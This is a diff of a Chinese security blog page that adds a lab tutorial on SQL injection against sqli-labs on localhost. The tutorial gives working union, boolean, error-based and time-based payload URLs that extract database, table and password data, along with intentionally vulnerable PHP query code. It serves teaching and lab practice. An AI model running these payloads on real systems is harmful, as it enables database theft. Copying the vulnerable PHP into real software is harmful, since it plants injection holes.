@@ -389,21 +389,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2019-06-10
+                    2019-07-23
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        146
+                        2k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        1 Min
+                        9 Min
                     </div>
                     
                 
@@ -420,7 +420,186 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>SQL注入漏洞是owasp发布的top10排行榜里一直排在第一的漏洞，一个严重的sql注入漏洞可能会直接导致一家公司破产。SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行，从而导致数据库受损（被脱裤，被删除，甚至整个服务器权限沦陷）。</p>
-<h2 id="数字型注入-POST"><a href="#数字型注入-POST" class="headerlink" title="数字型注入(POST)"></a>数字型注入(POST)</h2>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>sql注入的产生需要满足下列两个条件</p>
+<hr>
+<p>1.参数用户可控<br>2.参数带入数据库查询</p>
+<hr>
+<p>当传入的id参数为1’时，数据库执行代码如下</p>
+<pre><code>select * from users where id = 1&#39;
+</code></pre><p>这不符合数据库语法规范，所以会报错，当传入的等id参数为and 1=1时，执行的sql语句为</p>
+<pre><code>select * from users where id = 1 and 1=1
+</code></pre><p>因为id=1为真，1=1也为真，所以页面会返回和id=1相同的结果，当传入参数为and 1=2时，会报错。这就是初步判断存在sql注入的漏洞。</p>
+<h2 id="与mysql相关的知识点"><a href="#与mysql相关的知识点" class="headerlink" title="与mysql相关的知识点"></a>与mysql相关的知识点</h2><p>在mysql5.0版本之后，mysql数据库默认存放了一个“imforemation_schema”的数据库，在该库中，有三个表名需要记住,分别是<strong>SCHEMATA,TABLES,COLUMNS</strong><br>SCHEMATA表存储该用户创建的所有数据库名</p>
+<pre><code>mysql&gt; select * from SCHEMATA;
++--------------+--------------------+----------------------------+------------------------+----------+
+| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |
++--------------+--------------------+----------------------------+------------------------+----------+
+| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |
+| def          | bwapp              | utf8                       | utf8_general_ci        | NULL     |
+| def          | challenges         | gbk                        | gbk_chinese_ci         | NULL     |
+| def          | dedecmsv57utf8sp2  | utf8                       | utf8_general_ci        | NULL     |
+| def          | dvwa               | utf8                       | utf8_general_ci        | NULL     |
+| def          | mysql              | utf8                       | utf8_general_ci        | NULL     |
+| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |
+| def          | pikachu            | utf8                       | utf8_general_ci        | NULL     |
+| def          | security           | gbk                        | gbk_chinese_ci         | NULL     |
+| def          | test               | latin1                     | latin1_swedish_ci      | NULL     |
+| def          | test1              | utf8                       | utf8_general_ci        | NULL     |
+| def          | test2              | utf8                       | utf8_general_ci        | NULL     |
+| def          | wordpress          | utf8                       | utf8_general_ci        | NULL     |
++--------------+--------------------+----------------------------+------------------------+----------+
+</code></pre><p>TABLES表存储该用户创建的所有数据库的库名和表名，记录数据库名和表名的字段分别为TABLE SCHEMA和TABLE</p>
+<pre><code>mysql&gt; select * from TABLES;
++---------------+--------------------+----------------------------------------------+-------------+--------------------+---------+------------+------------+----------------+-------------+--------------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+--------------------+----------+-----------------+---------------------------------------------------+
+| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME                                   | TABLE_TYPE  | ENGINE             | VERSION | ROW_FORMAT | TABLE_ROWS | AVG_ROW_LENGTH | DATA_LENGTH | MAX_DATA_LENGTH    | INDEX_LENGTH | DATA_FREE | AUTO_INCREMENT | CREATE_TIME         | UPDATE_TIME         | CHECK_TIME          | TABLE_COLLATION    | CHECKSUM | CREATE_OPTIONS  | TABLE_COMMENT                                     |
++---------------+--------------------+----------------------------------------------+-------------+--------------------+---------+------------+------------+----------------+-------------+--------------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+--------------------+----------+-----------------+---------------------------------------------------+
+| def           | information_schema | CHARACTER_SETS                               | SYSTEM VIEW | MEMORY             |      10 | Fixed      |       NULL |            384 |           0 |           16604160 |            0 |         0 |           NULL | 2019-07-22 15:42:04 | NULL                | NULL                | utf8_general_ci    |     NULL | max_rows=43690  |                                                   |
+| def           | information_schema | COLLATIONS                                   | SYSTEM VIEW | MEMORY             |      10 | Fixed      |       NULL |            231 |           0 |           16704765 |            0 |         0 |           NULL | 2019-07-22 15:42:04 | NULL                | NULL                | utf8_general_ci    |     NULL | max_rows=72628  |                                                   |
+| def           | information_schema | COLLATION_CHARACTER_SET_APPLICABILITY        | SYSTEM VIEW | MEMORY             |      10 | Fixed      |       NULL |            195 |           0 |           16691610 |            0 |         0 |           NULL | 2019-07-22 15:42:04 | NULL                | NULL                | utf8_general_ci    |     NULL | max_rows=86037  |                                                   |
+| def           | information_schema | COLUMNS                                      | SYSTEM VIEW | MyISAM             |      10 | Dynamic    |       NULL |  
+</code></pre><p>COLUMNS表存储该用户创建的所有数据库名，表名和字段名,在这里先不展示了。</p>
+<h3 id="mysql查询语句"><a href="#mysql查询语句" class="headerlink" title="mysql查询语句"></a>mysql查询语句</h3><pre><code>select 要查询的字段名 from 库名.表名
+select 要查询的字段名 from 库名.表名 where 已知条件的字段名=&#39;已知条件的值&#39;
+</code></pre><h3 id="limit的用法"><a href="#limit的用法" class="headerlink" title="limit的用法"></a>limit的用法</h3><p>limit的使用格式是limit m,n 其中m指记录的开始位置，从0开始，表示第一条记录；n指取n条记录。例如limit 0，1表示从第一条记录开始，取一条记录，下面是使用limit和不使用limit的对比</p>
+<pre><code>mysql&gt; select * from users;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | admin      |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | dumbo      |
+| 14 | admin4   | admin4     |
++----+----------+------------+
+13 rows in set (0.00 sec)
+</code></pre><pre><code>mysql&gt; select * from users limit 0,1;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+</code></pre><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><p>在mysql中，注释符一般有：#或– 或/**/，中间的是–空格</p>
+<h3 id="内联函数"><a href="#内联函数" class="headerlink" title="内联函数"></a>内联函数</h3><p>内联函数的形式：</p>
+<pre><code>/*!code*/
+</code></pre><p>内联注释可以用于整个sql语句中,举个例子</p>
+<pre><code>index.php?id=-15 /*！union*/ /*!select*/ 1,2,3
+</code></pre><h2 id="union注入攻击"><a href="#union注入攻击" class="headerlink" title="union注入攻击"></a>union注入攻击</h2><p>使用union的前提是能注入，检验过能注入之后，就要使用order by来判断字段的数量了，在sqli-labs-master里，判断如下<br><img src="/2019/07/23/sql-inject/1.PNG" alt="order by 3"><br><img src="/2019/07/23/sql-inject/2.PNG" alt="order by 4"><br>发现字段数为3，所以union语句就是</p>
+<pre><code>union select 1,2,3
+</code></pre><p>此时可以设置id值为-1，就会返回union select的结果了<br><img src="/2019/07/23/sql-inject/3.PNG" alt=""><br>返回结果2，3说明2和3的位置可以输入mysql语句，尝试查看数据库名<br><img src="/2019/07/23/sql-inject/4.PNG" alt=""><br>查到数据库名为security<br>在得知了数据库之后，就可以使用命令来查询表名了</p>
+<pre><code>http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-1/?id=0&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+
+</code></pre><p>要注意的是id的值一定是数据库中不存在的id，否则不会执行后面的查询语句，还有单引号不能忘记加上<br><img src="/2019/07/23/sql-inject/5.PNG" alt=""><br>已知库名和表名，开始查询列名</p>
+<pre><code>http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-1/?id=0&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;emails&#39;--+
+</code></pre><p><img src="/2019/07/23/sql-inject/6.PNG" alt=""><br>最后查询字段值</p>
+<pre><code>http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-1/?id=0&#39; union select 1,2,group_concat(password) from security.users--+
+</code></pre><p><img src="/2019/07/23/sql-inject/7.PNG" alt=""><br>还有一条查看所有数据库的命令</p>
+<pre><code>http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-1/?id=0&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+
+</code></pre><p><img src="/2019/07/23/sql-inject/8.PNG" alt=""></p>
+<h2 id="Boolean注入攻击"><a href="#Boolean注入攻击" class="headerlink" title="Boolean注入攻击"></a>Boolean注入攻击</h2><p>代码分析</p>
+<pre><code>&lt;?php
+$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;);
+// 检测连接
+if (mysqli_connect_errno())
+{
+    echo &quot;连接失败: &quot; . mysqli_connect_error();
+}
+
+$id = $_GET[&#39;id&#39;];
+//匹配危险字符串
+if (preg_match(&quot;/union|sleep|benchmark/i&quot;, $id)) {
+    exit(&quot;no&quot;);
+}
+
+$result = mysqli_query($con,&quot;select * from users where `id`=&#39;&quot;.$id.&quot;&#39;&quot;);
+
+$row = mysqli_fetch_array($result);
+
+if ($row) {
+    exit(&quot;yes&quot;);
+}else{
+    exit(&quot;no&quot;);
+}
+
+?&gt;
+</code></pre><p>bool注入攻击页面只会回显yes和no，实际操作可能会比较麻烦<br>判断数据库名的长度</p>
+<pre><code>?id=1&#39; and length(database())&gt;=1--+
+</code></pre><p>找到最后返回yes的那个数字，就是数据库名的长度<br>获取数据库名(a-z,0-9)</p>
+<pre><code>id=1&#39; and substr(database(),1,1)=&#39;s&#39;--+
+</code></pre><p>用法：substr(string,start,length)。一般比较麻烦的情况下，可以采用暴力破解的方法，用burp抓包，然后修改参数就好了。<br>查询表名，字段名也应该粘贴在database()的位置</p>
+<pre><code>&#39; and substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)=&#39;e&#39;--+
+</code></pre><p>以此类推，也可以查看其他的表名和字段名</p>
+<h2 id="报错注入攻击"><a href="#报错注入攻击" class="headerlink" title="报错注入攻击"></a>报错注入攻击</h2><p>代码分析</p>
+<pre><code>&lt;?php
+$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;);
+// 检测连接
+if (mysqli_connect_errno())
+{
+    echo &quot;连接失败: &quot; . mysqli_connect_error();
+}
+
+$username = $_GET[&#39;username&#39;];
+
+if($result = mysqli_query($con,&quot;select * from users where `username`=&#39;&quot;.$username.&quot;&#39;&quot;)){
+    echo &quot;ok&quot;;
+}else{
+    echo mysqli_error($con);
+}
+
+?&gt;
+</code></pre><p>查询语句</p>
+<pre><code>&quot;select * from users where `username`=&#39;&quot;.$username.&quot;&#39;&quot;
+</code></pre><p>当我们输入1’的时候，结果变成了</p>
+<pre><code>&quot;select * from users where `username`=&#39;1&#39;&#39;
+</code></pre><p>从而引发报错<br>sql语句,查看用户信息</p>
+<pre><code>?username=1&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
+</code></pre><p>查看数据库名</p>
+<pre><code>?username=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
+</code></pre><p>获取表名</p>
+<pre><code>&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),0x7e),1)--+
+</code></pre><p>语法updatexml(目标xml文档，xml路径，更新的内容)<br>concat()的作用是连接字符串</p>
+<h2 id="时间注入攻击"><a href="#时间注入攻击" class="headerlink" title="时间注入攻击"></a>时间注入攻击</h2><p>代码分析</p>
+<pre><code>&lt;?php
+$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;);
+// 检测连接
+if (mysqli_connect_errno())
+{
+    echo &quot;连接失败: &quot; . mysqli_connect_error();
+}
+
+$id = $_GET[&#39;id&#39;];
+
+if (preg_match(&quot;/union/i&quot;, $id)) {
+    exit(&quot;&lt;htm&gt;&lt;body&gt;no&lt;/body&gt;&lt;/html&gt;&quot;);
+}
+
+$result = mysqli_query($con,&quot;select * from users where `id`=&#39;&quot;.$id.&quot;&#39;&quot;);
+
+$row = mysqli_fetch_array($result);
+
+if ($row) {
+    exit(&quot;&lt;htm&gt;&lt;body&gt;yes&lt;/body&gt;&lt;/html&gt;&quot;);
+}else{
+    exit(&quot;&lt;htm&gt;&lt;body&gt;no&lt;/body&gt;&lt;/html&gt;&quot;);
+}
+
+
+?&gt;
+</code></pre><p>和bool类型的页面返回类似，也是只有yes和no，但是这个会利用sleep()和benchmark()延长反应的时间，让mysql执行的时间变长</p>
+<pre><code>http://127.0.0.1/source%20code/4.2.2/time.php?id=1&#39; and if(length(database())&gt;7,sleep(5),1)--+
+</code></pre><p>这句话的意思是判断数据库名的长度，如果大于七，sleep5秒，否则执行1，通过页面返回的时间判断是不是存在时间注入</p>
+<pre><code>http://127.0.0.1/source%20code/4.2.2/time.php?id=1&#39; and if(substr(database(),1,1)=&#39;s&#39;,sleep(5),1)--+
+</code></pre><p>判断数据库名的第一个字母，如果是s那么sleep5秒，否则执行1<br>还有一种是通过ASCII值来判断</p>
+<pre><code>id=1&#39; and if(ord(substring(user(),1,1))=114,sleep(5),1)--+
+</code></pre><p>‘r’的ASCII值为114，if条件成立，sleep5秒</p>
+
             </div>
             <hr>
 
@@ -577,7 +756,7 @@
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
                     《Sql-inject》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/06/10/sql-inject/" property="cc:attributionName" rel="cc:attributionURL">
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/07/23/sql-inject/" property="cc:attributionName" rel="cc:attributionURL">
                 xiao
             </a> is licensed under a
             <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">
@@ -642,24 +821,24 @@
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2019/06/15/shen-tou-ce-shi-ba-ji-lian-xi-dc-1/">
+                <a href="/2019/07/24/weblogic-ssrf-lou-dong-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="渗透测试靶机练习 DC-1">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="weblogic ssrf 漏洞复现">
                         
-                        <span class="card-title">渗透测试靶机练习 DC-1</span>
+                        <span class="card-title">weblogic ssrf 漏洞复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            第一次深入的了解靶机，下面把我做题的整个流程写在下面，仅供参考靶机介绍我所用的靶机是在vulnhub上下载的，网址如下https://www.vulnhub.com/?page=1里面有许多靶机可以供我们练习，我之后也将会花很多时间去练习，
+                            ssrf简介SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-06-15
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-24
                         </span>
                         <span class="publish-author">
                             
@@ -672,8 +851,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/渗透测试/" target="_blank">
-                        <span class="chip bg-color">渗透测试</span>
+                    <a href="/tags/漏洞复现/" target="_blank">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
@@ -687,25 +866,25 @@
                 Next&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/06/10/csrf/">
+                <a href="/2019/07/20/wen-jian-shang-chuan-rao-guo-zi-shi-zong-jie/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="CSRF">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="文件上传绕过姿势总结">
                         
-                        <span class="card-title">CSRF</span>
+                        <span class="card-title">文件上传绕过姿势总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            概述CSRF是跨站请求伪造攻击的简称，在CSRF的攻击场景中攻击者会伪造一个请求（一般是一个链接），然后哦欺骗用户进行点击，用户一旦点击这个链接，整个攻击就完成了。所以CSRF也叫“one click”攻击。
-CSRF(GET)get方式的
+                            为什么有文件上传漏洞？上传文件时，如果服务器端没有对客户端上传的文件作严格的过滤和验证，就可以造成任意文件上传的漏洞，上传的脚本文件包括(asp,aspx,php,jsp等)
+绕过前端检测绕过如果控制文件上传的地方只有简单的前端验证，就是上
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-06-10
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-20
                             </span>
                         <span class="publish-author">
                             
@@ -718,8 +897,8 @@ CSRF(GET)get方式的
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/漏洞/" target="_blank">
-                        <span class="chip bg-color">漏洞</span>
+                    <a href="/tags/文件上传/" target="_blank">
+                        <span class="chip bg-color">文件上传</span>
                     </a>
                     
                 </div>
@@ -840,7 +1019,7 @@ CSRF(GET)get方式的
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">23.8k</span>
+                <span class="white-color">27.3k</span>
             
 
             
